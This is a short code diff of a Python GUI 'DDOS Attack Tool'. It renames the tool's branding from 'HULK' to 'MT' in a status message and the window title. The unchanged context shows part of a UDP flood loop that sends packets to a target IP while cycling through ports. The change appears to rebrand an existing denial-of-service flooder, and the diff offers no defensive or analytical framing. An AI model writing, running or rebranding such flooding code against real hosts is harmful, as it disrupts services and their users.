@@ -60,7 +60,7 @@ def attack():
         sock.sendto(bytes, (ip, port))
         sent = sent + 1
         port = port + 1
-        print("Sent %s packet to %s throught port:%s -by HULK" %
+        print("Sent %s packet to %s throught port:%s -by MT" %
               (sent, ip, port))
         if port == 65534:
             port = 1
@@ -69,7 +69,7 @@ def attack():
 
 
 root = Tk()
-root.title("HULK- DDOS Attack Tool")
+root.title("MT- DDOS Attack Tool")
 root.geometry("350x200+385+105")
 root.resizable(0, 0)
 
